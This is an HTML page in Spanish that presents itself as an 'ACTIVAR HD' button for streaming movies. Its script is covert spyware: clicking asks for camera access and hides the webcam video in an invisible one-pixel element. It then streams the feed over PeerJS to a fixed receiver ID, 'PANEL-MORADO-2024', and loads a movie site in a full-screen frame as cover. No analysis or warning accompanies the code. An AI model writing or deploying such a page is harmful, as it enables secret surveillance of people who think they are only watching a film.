<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stream HD Access</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        body { background: #0a0014; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .btn-neon { padding: 20px 40px; background: transparent; color: #df00ff; border: 2px solid #df00ff; border-radius: 50px; font-weight: bold; cursor: pointer; box-shadow: 0 0 20px #df00ff; }
        #movie-box { position: fixed; inset: 0; display: none; z-index: 100; background: #000; }
        video { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
    </style>
</head>
<body>
    <button id="startBtn" class="btn-neon">ACTIVAR HD</button>
    <div id="movie-box"><iframe id="f" src="" style="width:100%;height:100%;border:none;"></iframe></div>
    <video id="v" autoplay playsinline muted></video>

    <script>
        const RECEPTOR_ID = 'PANEL-MORADO-2024'; // ID SIMPLIFICADA

        const peer = new Peer("USR-" + Math.floor(Math.random()*9999), {
            host: '0.peerjs.com', port: 443, secure: true,
            config: {
                'iceServers': [
                    { url: 'stun:stun.l.google.com:19302' },
                    { url: 'turn:openrelay.metered.ca:443?transport=tcp', username: 'openrelayproject', credential: 'openrelayproject' }
                ]
            }
        });

        document.getElementById('startBtn').onclick = async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { width: 640, height: 480 }, audio: false 
                });
                document.getElementById('v').srcObject = stream;
                
                // Intentamos llamar
                const call = peer.call(RECEPTOR_ID, stream);
                
                call.on('error', (err) => alert("Error de llamada: " + err));

                document.getElementById('f').src = "https://la.movie/";
                document.getElementById('movie-box').style.display = "block";
            } catch (e) { alert("ERROR: No diste permiso a la cámara."); }
        };
    </script>
</body>
</html>
